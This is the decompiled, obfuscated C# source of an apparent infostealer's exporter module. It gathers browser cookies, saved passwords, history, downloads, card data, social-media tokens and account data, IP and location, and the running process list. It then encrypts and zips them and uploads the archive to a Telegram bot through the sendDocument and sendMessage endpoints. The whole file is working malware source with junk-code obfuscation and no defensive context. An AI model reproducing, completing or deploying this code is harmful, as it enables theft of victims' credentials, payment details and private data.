using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading;
using iCollector.Job.Handler;
using iCollector.Job.Model;
using iCollector.Model;
using iCollector.RestClient;
using iCollector.RestClient.Model;
using iCollector.Util;

namespace iCollector;

internal class MainExporter
{
	private static string CLAZZ_NAME_SE = "MainExporter";

	private static string CLAZZ_NAME = SecurityUtils.ReadStructEncrypted(CLAZZ_NAME_SE);

	private Logger log = Logger.Instance();

	private LogContext ctx = new LogContext(CLAZZ_NAME);

	private static readonly string BASE_URL_TELE_SE = "https://api.telegram.org/bot";

	private static readonly string BASE_URL_TELE;

	private static readonly string HIS_TEXT_FORMAT_SE;

	private static readonly string HIS_TEXT_FORMAT;

	private static readonly string PAZZ_TEXT_FORMAT_SE;

	private static readonly string PAZZ_TEXT_FORMAT;

	private static readonly string SYS_INFO_TEXT_FORMAT_SE;

	private static readonly string SYS_INFO_TEXT_FORMAT;

	private static readonly string FILE_NAME_LOG_SE;

	private static readonly string FILE_NAME_LOG;

	private static readonly string FILE_NAME_CYP_PREFIX_SE;

	private static readonly string FILE_NAME_CYP_PREFIX;

	private static readonly string FILE_NAME_COK_PREFIX_SE;

	private static readonly string FILE_NAME_COK_PREFIX;

	private static readonly string FILE_NAME_PAW_PREFIX_SE;

	private static readonly string FILE_NAME_PAW_PREFIX;

	private static readonly string FILE_NAME_HIY_PREFIX_SE;

	private static readonly string FILE_NAME_HIY_PREFIX;

	private static readonly string FILE_NAME_DWN_PREFIX_SE;

	private static readonly string FILE_NAME_DWN_PREFIX;

	private static readonly string FILE_NAME_CRD_PREFIX_SE;

	private static readonly string FILE_NAME_CRD_PREFIX;

	private static readonly string FILE_NAME_UAG_PREFIX_SE;

	private static readonly string FILE_NAME_UAG_PREFIX;

	private static readonly string FILE_NAME_DSA_PREFIX_SE;

	private static readonly string FILE_NAME_DSA_PREFIX;

	private static readonly string FILE_NAME_DSA_PREFIX_2_SE;

	private static readonly string FILE_NAME_DSA_PREFIX_2;

	private static readonly string FILE_NAME_CYP_SE;

	private static readonly string FILE_NAME_CYP;

	private static readonly string FILE_NAME_CFG_SE;

	private static readonly string FILE_NAME_CFG;

	private static readonly string FILE_NAME_PRS_SE;

	private static readonly string FILE_NAME_PRS;

	private IRestClient restClient = new DefaultRestClient(new RestOptions());

	public void Export(CKProfile profile)
	{
		try
		{
			if (2u != 0 && 4u != 0)
			{
				if (0 == 0 && 2u != 0)
				{
					ExecuteWriteProfile(profile);
				}
			}
			while (false)
			{
			}
		}
		catch (Exception ex)
		{
			if (7u != 0)
			{
				log.Error(ctx, ex.ToString());
			}
		}
	}

	public void Export(ClientInfo clientInfo)
	{
		try
		{
			if (2u != 0 && 4u != 0)
			{
				if (0 == 0 && 2u != 0)
				{
					ExecuteWriteEmptyProfile(clientInfo);
				}
			}
			while (false)
			{
			}
		}
		catch (Exception ex)
		{
			if (7u != 0)
			{
				log.Error(ctx, ex.ToString());
			}
		}
	}

	private void WriteToStream(byte[] content, string path, ZipArchive archive)
	{
		try
		{
			ZipArchiveEntry zipArchiveEntry = archive.CreateEntry(path);
			ZipArchiveEntry zipArchiveEntry2 = default(ZipArchiveEntry);
			if (5u != 0 && 0 == 0)
			{
				zipArchiveEntry2 = zipArchiveEntry;
			}
			MemoryStream memoryStream = new MemoryStream(content);
			MemoryStream memoryStream2;
			if (5u != 0 && 3u != 0)
			{
				memoryStream2 = memoryStream;
			}
			try
			{
				Stream stream2 = default(Stream);
				while (true)
				{
					if (8u != 0)
					{
						goto IL_001b;
					}
					goto IL_004c;
					IL_004c:
					if (true)
					{
						if (2u != 0 && (false || 3u != 0))
						{
							break;
						}
						continue;
					}
					goto IL_001b;
					IL_001b:
					Stream stream = zipArchiveEntry2.Open();
					if (0 == 0 && 8u != 0)
					{
						stream2 = stream;
					}
					try
					{
						Stream destination = stream2;
						if (0 == 0 && 0 == 0)
						{
							memoryStream2.CopyTo(destination);
						}
					}
					finally
					{
						while (stream2 != null)
						{
							if (0 == 0)
							{
								if (0 == 0)
								{
									((IDisposable)stream2).Dispose();
								}
								break;
							}
						}
					}
					goto IL_004c;
				}
			}
			finally
			{
				if (memoryStream2 != null)
				{
					goto IL_0066;
				}
				goto IL_006c;
				IL_006c:
				if (false)
				{
					goto IL_0066;
				}
				goto end_IL_0063;
				IL_0066:
				((IDisposable)memoryStream2).Dispose();
				goto IL_006c;
				end_IL_0063:;
			}
		}
		catch (Exception ex)
		{
			log.Error(ctx, ex.ToString());
		}
	}

	private void ExecuteWriteEmptyProfile(ClientInfo clientInfo)
	{
		string gUID = CacheRepository.GetGUID();
		string text = default(string);
		if (0 == 0)
		{
			text = gUID;
		}
		string[] obj = new string[7] { text, "_SDC_", null, null, null, null, null };
		DateTime utcNow = DateTime.UtcNow;
		DateTime dateTime = default(DateTime);
		if (0 == 0)
		{
			dateTime = utcNow;
		}
		DateTime dateTime2 = dateTime.AddHours(7.0);
		if (0 == 0)
		{
			dateTime = dateTime2;
		}
		obj[2] = dateTime.ToString("ddMMyyyyhhmmss");
		obj[3] = "_";
		obj[4] = CacheRepository.VERSION;
		obj[5] = "_";
		int ranTimes = CacheRepository.GetRanTimes();
		int num;
		if (2u != 0)
		{
			num = ranTimes;
		}
		obj[6] = num.ToString();
		string text2 = string.Concat(obj).ToUpper();
		string text3 = default(string);
		if (0 == 0)
		{
			text3 = text2;
		}
		MemoryStream memoryStream2 = default(MemoryStream);
		do
		{
			if (false)
			{
				continue;
			}
			MemoryStream memoryStream = new MemoryStream();
			if (0 == 0)
			{
				memoryStream2 = memoryStream;
			}
			try
			{
				ZipArchive zipArchive = new ZipArchive(memoryStream2, ZipArchiveMode.Create, leaveOpen: true);
				try
				{
					byte[] content = Encode(log.GetLogContent());
					string sysPath = GetSysPath(FILE_NAME_LOG);
					if (7u != 0)
					{
						WriteToStream(content, sysPath, zipArchive);
					}
					byte[] bytes = Encoding.UTF8.GetBytes(SecurityUtils.EncryptRSA(SecurityUtils.AES_KEY_BYTES));
					string path = FILE_NAME_CYP_PREFIX + text + "}/" + FILE_NAME_CYP;
					if (8u != 0)
					{
						WriteToStream(bytes, path, zipArchive);
					}
					byte[] content2 = Encode(GetSysText(clientInfo));
					string sysPath2 = GetSysPath(FILE_NAME_CFG);
					if (uint.MaxValue != 0)
					{
						WriteToStream(content2, sysPath2, zipArchive);
					}
					byte[] content3 = Encode(GetPRS());
					string sysPath3 = GetSysPath(FILE_NAME_PRS);
					if (3u != 0)
					{
						WriteToStream(content3, sysPath3, zipArchive);
					}
					if (0 == 0)
					{
						zipArchive.Dispose();
					}
					MemoryStream ms = memoryStream2;
					string fileName = text3 + ".zip";
					string titlePushStream = GetTitlePushStream(null);
					if (0 == 0)
					{
						PushStream(ms, fileName, titlePushStream, 10);
					}
				}
				finally
				{
					if (zipArchive != null)
					{
						goto IL_019d;
					}
					goto IL_01a3;
					IL_01a3:
					if (false)
					{
						goto IL_019d;
					}
					goto end_IL_019a;
					IL_019d:
					((IDisposable)zipArchive).Dispose();
					goto IL_01a3;
					end_IL_019a:;
				}
			}
			finally
			{
				((IDisposable)memoryStream2)?.Dispose();
			}
		}
		while (false);
	}

	private void ExecuteWriteProfile(CKProfile profile)
	{
		string gUID = CacheRepository.GetGUID();
		string text;
		if (6u != 0)
		{
			text = gUID;
		}
		string[] obj = new string[9] { text, "_", profile.Name, "_", null, null, null, null, null };
		DateTime utcNow = DateTime.UtcNow;
		DateTime dateTime = default(DateTime);
		if (0 == 0)
		{
			dateTime = utcNow;
		}
		DateTime dateTime2 = dateTime.AddHours(7.0);
		if (7u != 0)
		{
			dateTime = dateTime2;
		}
		obj[4] = dateTime.ToString("ddMMyyyyhhmmss");
		obj[5] = "_";
		obj[6] = CacheRepository.VERSION;
		obj[7] = "_";
		int ranTimes = CacheRepository.GetRanTimes();
		int num;
		if (8u != 0)
		{
			num = ranTimes;
		}
		obj[8] = num.ToString();
		string text2 = string.Concat(obj).ToUpper();
		string text3;
		if (6u != 0)
		{
			text3 = text2;
		}
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = default(MemoryStream);
		if (0 == 0)
		{
			memoryStream2 = memoryStream;
		}
		try
		{
			using ZipArchive zipArchive = new ZipArchive(memoryStream2, ZipArchiveMode.Create, leaveOpen: true);
			byte[] content = Encode(log.GetLogContent());
			string sysPath = GetSysPath(FILE_NAME_LOG);
			if (6u != 0)
			{
				WriteToStream(content, sysPath, zipArchive);
			}
			byte[] bytes = Encoding.UTF8.GetBytes(SecurityUtils.EncryptRSA(SecurityUtils.AES_KEY_BYTES));
			string path = FILE_NAME_CYP_PREFIX + text + "}/" + FILE_NAME_CYP;
			if (0 == 0)
			{
				WriteToStream(bytes, path, zipArchive);
			}
			string text4 = "{" + profile.Type + text + "}";
			string text5;
			if (6u != 0)
			{
				text5 = text4;
			}
			if (profile.IdHeaderValues != null && profile.IdHeaderValues.Count > 0)
			{
				byte[] content2 = Encode(Converter.ConvertToString(profile.IdHeaderValues));
				string path2 = text5 + FILE_NAME_COK_PREFIX + profile.Name + "}.txt";
				if (0 == 0)
				{
					WriteToStream(content2, path2, zipArchive);
				}
			}
			if (profile.PazzValues != null && profile.PazzValues.Count > 0)
			{
				byte[] content3 = Encode(ToPazzText(profile.PazzValues));
				string path3 = text5 + FILE_NAME_PAW_PREFIX + profile.Name + "}.txt";
				if (0 == 0)
				{
					WriteToStream(content3, path3, zipArchive);
				}
			}
			if (profile.HisValues != null && profile.HisValues.Count > 0)
			{
				byte[] content4 = Encode(ToHisText(profile.HisValues));
				string path4 = text5 + FILE_NAME_HIY_PREFIX + profile.Name + "}.txt";
				if (3u != 0)
				{
					WriteToStream(content4, path4, zipArchive);
				}
			}
			if (profile.DownloadValues != null && profile.DownloadValues.Count > 0)
			{
				WriteToStream(Encode(string.Join("\n\n", profile.DownloadValues)), text5 + FILE_NAME_DWN_PREFIX + profile.Name + "}.txt", zipArchive);
			}
			if (profile.CcValues != null && profile.CcValues.Count > 0)
			{
				WriteToStream(Encode(string.Join("\n\n", profile.CcValues)), text5 + FILE_NAME_CRD_PREFIX + profile.Name + "}.txt", zipArchive);
			}
			if (profile.ClientInfo != null && !string.IsNullOrEmpty(profile.ClientInfo.UA))
			{
				WriteToStream(Encode(profile.ClientInfo.UA), text5 + FILE_NAME_UAG_PREFIX + profile.Name + "}.txt", zipArchive);
			}
			if (profile.SocialProfile != null)
			{
				WriteToStream(Encode(GetDSAText(profile)), FILE_NAME_DSA_PREFIX + text + FILE_NAME_DSA_PREFIX_2 + profile.Name + "}.txt", zipArchive);
			}
			WriteToStream(Encode(GetSysText(profile)), GetSysPath(FILE_NAME_CFG), zipArchive);
			WriteToStream(Encode(GetPRS()), GetSysPath(FILE_NAME_PRS), zipArchive);
			zipArchive.Dispose();
			PushStream(memoryStream2, text3 + ".zip", GetTitlePushStream(profile), 10);
		}
		finally
		{
			((IDisposable)memoryStream2)?.Dispose();
		}
	}

	private string GetSysText(ClientInfo clientInfo)
	{
		return string.Format(SYS_INFO_TEXT_FORMAT, (clientInfo != null) ? clientInfo.Ip : "", "", "", "", "", "", "", "", (clientInfo != null) ? clientInfo.Address : "", "", "", "", "", CacheRepository.GetGUID(), CacheRepository.VERSION, "");
	}

	private string GetSysText(CKProfile profile)
	{
		return string.Format(SYS_INFO_TEXT_FORMAT, (profile.ClientInfo != null) ? profile.ClientInfo.Ip : "", "", "", "", "", "", "", "", (profile.ClientInfo != null) ? profile.ClientInfo.Address : "", "", "", "", "", CacheRepository.GetGUID(), CacheRepository.VERSION, "");
	}

	private string ToHisText(List<DynamicObject> values)
	{
		return string.Join("\n\n", (from item in values.AsEnumerable()
			select string.Format(HIS_TEXT_FORMAT, item.GetString("url"), item.GetString("title"), item.GetString("visitAt"))).ToList());
	}

	private string ToPazzText(List<DynamicObject> values)
	{
		return string.Join("\n\n", (from item in values.AsEnumerable()
			select string.Format(PAZZ_TEXT_FORMAT, item.GetString("url"), item.GetString("username"), item.GetString("password"))).ToList());
	}

	private string GetDSAText(CKProfile profile)
	{
		SocialProfile socialProfile2;
		DynamicObject dynamicObject2 = default(DynamicObject);
		if (0 == 0)
		{
			SocialProfile socialProfile = profile.SocialProfile;
			if (6u != 0)
			{
				socialProfile2 = socialProfile;
			}
			if (socialProfile2 == null)
			{
				return "{}";
			}
			DynamicObject dynamicObject = new DynamicObject();
			if (0 == 0)
			{
				dynamicObject2 = dynamicObject;
			}
			DynamicObject dynamicObject3 = dynamicObject2;
			string resourceUID = profile.ResourceUID;
			if (uint.MaxValue != 0)
			{
				dynamicObject3.Put("id", resourceUID);
			}
		}
		DynamicObject dynamicObject4 = dynamicObject2;
		string name = profile.Name;
		if (0 == 0)
		{
			dynamicObject4.Put("profile_id", name);
		}
		DynamicObject dynamicObject5 = dynamicObject2;
		if (uint.MaxValue != 0)
		{
			dynamicObject5.Put("error_code", "SUCCESS");
		}
		DynamicObject dynamicObject6 = dynamicObject2;
		if (5u != 0)
		{
			dynamicObject6.Put("error_message", "");
		}
		DynamicObject dynamicObject7 = dynamicObject2;
		List<string> tokens = socialProfile2.Tokens;
		if (0 == 0)
		{
			dynamicObject7.Put("tokens", tokens);
		}
		DynamicObject dynamicObject8 = dynamicObject2;
		string resourceIdHeader = profile.ResourceIdHeader;
		if (0 == 0)
		{
			dynamicObject8.Put("coks", resourceIdHeader);
		}
		DynamicObject dynamicObject9 = dynamicObject2;
		object value = !socialProfile2.Live;
		if (true)
		{
			dynamicObject9.Put("checkpoint", value);
		}
		if (6u != 0)
		{
			if (profile.ClientInfo != null)
			{
				DynamicObject dynamicObject10 = dynamicObject2;
				string uA = profile.ClientInfo.UA;
				if (0 == 0)
				{
					dynamicObject10.Put("ua", uA);
				}
				DynamicObject dynamicObject11 = dynamicObject2;
				string ip = profile.ClientInfo.Ip;
				if (uint.MaxValue != 0)
				{
					dynamicObject11.Put("ip", ip);
				}
				DynamicObject dynamicObject12 = dynamicObject2;
				string address = profile.ClientInfo.Address;
				if (5u != 0)
				{
					dynamicObject12.Put("ip_address", address);
				}
			}
			if (socialProfile2.SocialResourceResult != null)
			{
				goto IL_012a;
			}
		}
		if (4u != 0)
		{
			if (socialProfile2.SocialBusinesssResourceResult != null)
			{
				goto IL_012a;
			}
			goto IL_016e;
		}
		goto IL_0176;
		IL_018c:
		if (socialProfile2.PersonalInfo != null && socialProfile2.PersonalInfo.PersonalInfo != null)
		{
			DynamicObject personalInfo = socialProfile2.PersonalInfo.PersonalInfo;
			dynamicObject2.Put("personal_info", personalInfo.GetString("name") + " - " + personalInfo.GetString("text"));
		}
		return Converter.ConvertToString(dynamicObject2);
		IL_0176:
		dynamicObject2.PutDynamicObjects("mtbs", socialProfile2.SocialBusinesssResourceResult.BusinessAccounts);
		goto IL_018c;
		IL_012a:
		dynamicObject2.PutDynamicObjects("mtas", Converter.MergeAllAccounts((socialProfile2.SocialResourceResult != null) ? socialProfile2.SocialResourceResult.Accounts : new List<DynamicObject>(), (socialProfile2.SocialBusinesssResourceResult != null) ? socialProfile2.SocialBusinesssResourceResult.BusinessAccounts : new List<DynamicObject>()));
		goto IL_016e;
		IL_016e:
		if (socialProfile2.SocialBusinesssResourceResult != null)
		{
			goto IL_0176;
		}
		goto IL_018c;
	}

	private string GetTitlePushStream(CKProfile? profile)
	{
		string[] obj = new string[8]
		{
			"LOG|",
			CacheRepository.GetGUID(),
			"_",
			(profile == null) ? "SDC" : profile.Name,
			"|PUSH|",
			CacheRepository.VERSION,
			"_",
			null
		};
		int ranTimes = CacheRepository.GetRanTimes();
		int num = default(int);
		if (uint.MaxValue != 0 && 0 == 0)
		{
			num = ranTimes;
		}
		obj[7] = num.ToString();
		return string.Concat(obj);
	}

	public void PushStream(MemoryStream ms, string fileName, string title, int retryTime)
	{
		int num = default(int);
		if (0 == 0 && 0 == 0)
		{
			num = 0;
		}
		Logger logger2;
		LogContext logContext2;
		string message2;
		while (true)
		{
			int num2 = num;
			do
			{
				if (num2 < retryTime)
				{
					if (0 == 0)
					{
						num2 = (ExecutePushStream(new MemoryStream(ms.ToArray()), fileName, title) ? 1 : 0);
						continue;
					}
					return;
				}
				Logger logger = log;
				LogContext logContext = ctx;
				string message = "Push stream " + fileName + " with title " + title + " failed";
				if (0 == 0 && 7u != 0)
				{
					logger.Error(logContext, message);
				}
				return;
			}
			while (5 == 0);
			if (num2 != 0)
			{
				logger2 = log;
				logContext2 = ctx;
				message2 = "Push stream " + fileName + " with title " + title + " success";
				if (true)
				{
					break;
				}
				return;
			}
			ms.Seek(0L, SeekOrigin.Begin);
			int num3 = 5000;
			do
			{
				if (8u != 0 && 2u != 0)
				{
					Thread.Sleep(num3);
				}
				num3 = num + 1;
			}
			while (false);
			if (0 == 0 && 4u != 0)
			{
				num = num3;
			}
		}
		if (0 == 0)
		{
			logger2.Info(logContext2, message2);
		}
	}

	public bool ExecutePushStream(MemoryStream ms, string fileName, string title)
	{
		try
		{
			MultipartFormDataContent multipartFormDataContent2 = default(MultipartFormDataContent);
			if (0 == 0)
			{
				if (4 == 0)
				{
					goto IL_003d;
				}
				MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
				if (7u != 0 && 2u != 0)
				{
					multipartFormDataContent2 = multipartFormDataContent;
				}
				if (4 == 0)
				{
					goto IL_0056;
				}
				MultipartFormDataContent multipartFormDataContent3 = multipartFormDataContent2;
				StringContent content = new StringContent(ProfileUtils.BCHATID);
				if (0 == 0 && 0 == 0)
				{
					multipartFormDataContent3.Add(content, "chat_id");
				}
			}
			MultipartFormDataContent multipartFormDataContent4 = multipartFormDataContent2;
			StringContent content2 = new StringContent(title);
			if ((0 == 0) ? true : false)
			{
				multipartFormDataContent4.Add(content2, "caption");
			}
			goto IL_003d;
			IL_0056:
			bool success = restClient.PostMultipartForm(BASE_URL_TELE + ProfileUtils.BTOKEN + "/sendDocument", multipartFormDataContent2, new string[0]).Success;
			bool result = default(bool);
			if (0 == 0)
			{
				if (6u != 0)
				{
					return success;
				}
				return result;
			}
			return result;
			IL_003d:
			MultipartFormDataContent multipartFormDataContent5 = multipartFormDataContent2;
			ByteArrayContent content3 = new ByteArrayContent(ms.ToArray());
			if (0 == 0 && 7u != 0)
			{
				multipartFormDataContent5.Add(content3, "document", fileName);
			}
			goto IL_0056;
		}
		catch (Exception ex)
		{
			log.Info(ctx, ex.ToString());
			return false;
		}
	}

	public void PushMessage(string msg, int retryTime)
	{
		while (true)
		{
			int num;
			if ((5u != 0) ? true : false)
			{
				num = 0;
			}
			while (true)
			{
				if (3u != 0)
				{
				}
				while (true)
				{
					int num2;
					int num3;
					if (num < retryTime)
					{
						if (!ExecutePushMessage(msg))
						{
							num2 = 5000;
							num3 = 0;
							while (true)
							{
								if (num3 == 0 && 0 == 0)
								{
									Thread.Sleep(num2);
								}
								if (2 == 0)
								{
									break;
								}
								if (3u != 0)
								{
									num2 = num;
									num3 = 1;
									if (num3 == 0)
									{
										continue;
									}
									num2 += num3;
									num3 = 0;
									if (num3 != 0)
									{
										continue;
									}
									goto IL_005e;
								}
								goto IL_0065;
							}
						}
						if (8 == 0)
						{
							break;
						}
						Logger logger = log;
						LogContext logContext = ctx;
						string message = "Push message '" + msg + "' success";
						if (5u != 0 && 0 == 0)
						{
							logger.Info(logContext, message);
						}
						if (false)
						{
							goto end_IL_0008;
						}
						if (0 == 0)
						{
							return;
						}
						continue;
					}
					goto IL_0065;
					IL_005e:
					if (num3 == 0 && 7u != 0)
					{
						num = num2;
					}
					continue;
					IL_0065:
					Logger logger2 = log;
					LogContext logContext2 = ctx;
					string message2 = "Push message '" + msg + "' failed";
					if (0 == 0 && 2u != 0)
					{
						logger2.Error(logContext2, message2);
					}
					return;
				}
				continue;
				end_IL_0008:
				break;
			}
		}
	}

	public bool ExecutePushMessage(string msg)
	{
		try
		{
			string body = default(string);
			if (true)
			{
				string text = "{\"chat_id\":\"" + ProfileUtils.BCHATID + "\",\"text\":\"" + msg + "\"}";
				if (0 == 0 && 8u != 0)
				{
					body = text;
				}
			}
			bool success = restClient.Post(BASE_URL_TELE + ProfileUtils.BTOKEN + "/sendMessage", body, new string[1] { "Content-Type: application/json" }).Success;
			bool result = default(bool);
			if (4u != 0)
			{
				if (0 == 0)
				{
					return success;
				}
				return result;
			}
			return result;
		}
		catch (Exception ex)
		{
			log.Error(ctx, ex.ToString());
			return false;
		}
	}

	private string GetPRS()
	{
		string result = default(string);
		try
		{
			if (0 == 0)
			{
				string text = string.Join("\n", (from process in Process.GetProcesses().AsEnumerable()
					select process.ProcessName).ToList());
				if (0 == 0)
				{
					if (0 == 0)
					{
						result = text;
						return result;
					}
					return result;
				}
				return result;
			}
			return result;
		}
		catch (Exception)
		{
			if (2u != 0)
			{
				return "";
			}
			return result;
		}
	}

	private string GetSysPath(string fileName)
	{
		return "{SYT" + CacheRepository.GetGUID() + "}/" + fileName;
	}

	private byte[] Encode(string originalText)
	{
		return Encoding.UTF8.GetBytes(SecurityUtils.EncryptAES(originalText));
	}

	internal void MakeStartSignal()
	{
		int num = default(int);
		do
		{
			if (0 == 0 && 0 == 0)
			{
				string gUID = CacheRepository.GetGUID();
				int ranTimes = CacheRepository.GetRanTimes();
				if (0 == 0 && 0 == 0)
				{
					num = ranTimes;
				}
				string msg = "REQ|" + gUID + "|READY|" + num;
				if (0 == 0 && 0 == 0)
				{
					PushMessage(msg, 3);
				}
			}
		}
		while (false);
	}

	static MainExporter()
	{
		if (0 == 0)
		{
			if (false)
			{
				goto IL_014e;
			}
			BASE_URL_TELE = SecurityUtils.ReadStructEncrypted(BASE_URL_TELE_SE);
			if (false)
			{
				goto IL_00c8;
			}
			HIS_TEXT_FORMAT_SE = "URL: {0}
Title: {1}
Last Visit: {2}";
			HIS_TEXT_FORMAT = SecurityUtils.ReadStructEncrypted(HIS_TEXT_FORMAT_SE);
			PAZZ_TEXT_FORMAT_SE = "URL: {0}
Username: {1}
Password: {2}";
			PAZZ_TEXT_FORMAT = SecurityUtils.ReadStructEncrypted(PAZZ_TEXT_FORMAT_SE);
			SYS_INFO_TEXT_FORMAT_SE = "User: {0}
IP: {1}
OS Name: {2}
OS Version: {3}
Monitors: {4}
CPU: {5}
GPU: {6}
RAM: {7}
Country: {8}
CC: {9}
City: {10}
Coordinator: {11}
HardwareId: {12}
GUID: {13}
SDCV: {14}
FPXUrl: {15}";
		}
		SYS_INFO_TEXT_FORMAT = SecurityUtils.ReadStructEncrypted(SYS_INFO_TEXT_FORMAT_SE);
		FILE_NAME_LOG_SE = "{LOG}.txt";
		FILE_NAME_LOG = SecurityUtils.ReadStructEncrypted(FILE_NAME_LOG_SE);
		goto IL_00a5;
		IL_01a5:
		FILE_NAME_CYP = SecurityUtils.ReadStructEncrypted(FILE_NAME_CYP_SE);
		FILE_NAME_CFG_SE = "{CFG}.txt";
		FILE_NAME_CFG = SecurityUtils.ReadStructEncrypted(FILE_NAME_CFG_SE);
		FILE_NAME_PRS_SE = "{PRS}.txt";
		goto IL_01d7;
		IL_01d7:
		FILE_NAME_PRS = SecurityUtils.ReadStructEncrypted(FILE_NAME_PRS_SE);
		return;
		IL_014e:
		if (0 == 0)
		{
			FILE_NAME_UAG_PREFIX = SecurityUtils.ReadStructEncrypted(FILE_NAME_UAG_PREFIX_SE);
			FILE_NAME_DSA_PREFIX_SE = "{DSA";
			FILE_NAME_DSA_PREFIX = SecurityUtils.ReadStructEncrypted(FILE_NAME_DSA_PREFIX_SE);
			FILE_NAME_DSA_PREFIX_2_SE = "}/{MTA";
			FILE_NAME_DSA_PREFIX_2 = SecurityUtils.ReadStructEncrypted(FILE_NAME_DSA_PREFIX_2_SE);
			if (1 == 0)
			{
				goto IL_00a5;
			}
			FILE_NAME_CYP_SE = "{CYR}.txt";
			goto IL_01a5;
		}
		goto IL_01d7;
		IL_00c8:
		FILE_NAME_COK_PREFIX = SecurityUtils.ReadStructEncrypted(FILE_NAME_COK_PREFIX_SE);
		if (6u != 0)
		{
			FILE_NAME_PAW_PREFIX_SE = "/{PAW";
			FILE_NAME_PAW_PREFIX = SecurityUtils.ReadStructEncrypted(FILE_NAME_PAW_PREFIX_SE);
			FILE_NAME_HIY_PREFIX_SE = "/{HIY";
			if (2 == 0)
			{
				goto IL_00af;
			}
			FILE_NAME_HIY_PREFIX = SecurityUtils.ReadStructEncrypted(FILE_NAME_HIY_PREFIX_SE);
			FILE_NAME_DWN_PREFIX_SE = "/{DWN";
			FILE_NAME_DWN_PREFIX = SecurityUtils.ReadStructEncrypted(FILE_NAME_DWN_PREFIX_SE);
			FILE_NAME_CRD_PREFIX_SE = "/{CRD";
			FILE_NAME_CRD_PREFIX = SecurityUtils.ReadStructEncrypted(FILE_NAME_CRD_PREFIX_SE);
			FILE_NAME_UAG_PREFIX_SE = "/{UAG";
			goto IL_014e;
		}
		goto IL_01a5;
		IL_00a5:
		FILE_NAME_CYP_PREFIX_SE = "{CYP";
		goto IL_00af;
		IL_00af:
		FILE_NAME_CYP_PREFIX = SecurityUtils.ReadStructEncrypted(FILE_NAME_CYP_PREFIX_SE);
		FILE_NAME_COK_PREFIX_SE = "/{COK";
		goto IL_00c8;
	}
}
